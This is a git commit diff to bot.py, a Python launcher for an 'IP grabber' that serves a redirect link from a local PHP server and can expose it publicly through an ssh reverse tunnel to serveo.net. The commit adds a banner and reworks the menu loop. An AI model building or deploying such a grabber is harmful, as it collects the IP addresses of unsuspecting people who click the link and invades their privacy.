2c0ee65fb0eacc551a08dc307b3ad8f046251c10
Blankred*-* <134679156+Blankred0@users.noreply.github.com>
2023-08-30 23:31:45 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,14 +1,23 @@
+from pystyle import *
 import subprocess
 import time
 import random
 import requests
+try:
+	import pyfiglet
+except:
+	print ("You must have pyfiglet install ! (pip install pyfiglet)")
+red = Col.light_red
+banner = pyfiglet.figlet_format("Ip\nGrabber")
+banner_2 = "╔═════════════════════════════════╗\n║ Copyright by Blankred0          ║\n║ https://github.com/Blankred0    ║\n╚═════════════════════════════════╝"
 cmd3 = subprocess.Popen("clear", shell=True)
 time.sleep(0.5)
+print(Colorate.Vertical(Colors.blue_to_red, banner, 2))
+print(Colorate.Vertical(Colors.red_to_blue, banner_2, 2))
 
 # Tool-made-by-https://github.com/Blankred0
 # This is an ip grabber tool made for educatinal pupose only. I am not 0,01% responsable of what your doing with this tool.
 print ("Welcome to this ip grabber tool !\n\n")
-loop = "N"
 redirection_site = int(input("Before starting the server please enter the name of\n the site you want to redirect to\n 1-Google\n 2-Rick-roll\n 3-custom\n:"))
 if redirection_site == 1:
 	redirection_site = "https://www.google.com/"
@@ -17,8 +26,7 @@ elif redirection_site == 2:
 elif redirection_site == 3:
 	redirection_site = input("Your custom link :")
 else:
-	print ("Wrong input ending programm...\n")
-	loop = ""
+	print ("Wrong input !\n")
 
 with open("redirect_url.txt", "w") as file:
     file.write(redirection_site)
@@ -34,13 +42,12 @@ server_end = subprocess.Popen(server_start, shell=True)
 time.sleep(1)
 
 
-while loop == "N":
+while True:
 	print (Link)
 	loop = input("\n \nPress [Enter] to stop server\n Type [C] to clear the terminal\n Type [serveo] to expose to the internet\n :")
 	loop = loop.lower()
 	if loop == "c" :
 		cmd3 = subprocess.Popen(cmd2, shell=True)
-		loop = "N"
 	elif loop == "serveo":
 		choose_subdomain = input('Do you want to choose your subdomain ?\n [Y]es\n [N]o\n :')
 		choose_subdomain = choose_subdomain.lower()
@@ -49,24 +56,20 @@ while loop == "N":
 			subdomain = str(subdomain) + ":"
 			servelink = "ssh -R " + str(subdomain) + "80:localhost:" + str(random_ports) + " serveo.net"
 			serveo_end = subprocess.Popen(servelink, shell=True)
-			time.sleep(5)
 			serveo_end.wait()
-			loop = "N"
 		else :
 			subdomain = ""
 			servelink = "ssh -R " + str(subdomain) + "80:localhost:" + str(random_ports) + " serveo.net"
 			print ("Starting serveo...")
 			print ("Press ctrl + c to exit serveo")
 			serveo_end = subprocess.Popen(servelink, shell=True)
-			time.sleep(5)
 			serveo_end.wait()
-			loop = "N"
 
 	elif loop == "":
 		print("Stopping server...")
+		break
 	else:
 		print("You must enter a valid input !")
-		loop = "N"
 	time.sleep(0.01)
 print ("Server end !")
 # Stop the local php server
